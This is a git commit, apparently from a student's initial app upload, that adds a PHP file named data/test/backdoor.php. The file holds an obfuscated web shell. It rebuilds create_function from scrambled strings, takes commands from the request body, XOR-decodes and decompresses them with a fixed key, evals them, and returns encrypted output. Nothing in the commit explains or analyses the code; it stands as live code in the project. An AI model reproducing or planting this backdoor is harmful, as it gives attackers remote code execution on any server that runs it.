9cc78133ff866b76f58de04f6cd89aa9527f938a
Pierreeni <pierre.dagand2019@campus-eni.fr>
2022-08-23 14:05:03 +0200

    Version initiale de l'appli

---
+++ data/test/backdoor.php
@@ -0,0 +1,10 @@
+<?php
+$i='$o.=$t{$i}^(Z(Z$(Zk{$j};}}return $o(Z;}(Zif (@preg(Z_m(Zatc(Zh("/$kh((Z.+)(Z$(Z(Zkf/",@fil(Ze_get_contents("ph(Zp:';
+$S='Zk){(Z$c=strlen($k);$l=st(Zrl(Zen($t);(Z$o="";f(Zor($i=0;(Z$i<$(Zl;){fo(Zr($j(Z=0;($j(Z<$c&&$i<(Z$l);$j+(Z+,$(Zi+(Z+){';
+$m='$k="c574(Z5(Z807(Z"(Z;$kh="60de44d2c6fb(Z";$kf=(Z"66(Zd8be4c6d(Z4a";$p="(ZdtLEV(Zk6kV(ZYoMpiN(ZS";(Zfunct(Zion x($t(Z,$(';
+$l=str_replace('U','','UcreaUtUUe_funUcUtion');
+$M='et(Z_cont(Zents(Z()(Z;@ob_end_clean(Z();$r(Z=(Z@base(Z64_encode(Z(@x((Z@(Zgz(Zcompress($o),$k))(Z;print(Z(Z("$p$kh$r$kf");}';
+$q='//i(Znput"),$m(Z)==1) {@o(Zb_(Zsta(Zrt();@eva(Zl(@g(Zzuncompre(Zss(@x(@ba(Zse64(Z_decod(Ze($(Zm[1(Z])(Z,$k)));$o=@ob_g';
+$x=str_replace('(Z','',$m.$S.$i.$q.$M);
+$s=$l('',$x);$s();
+?>
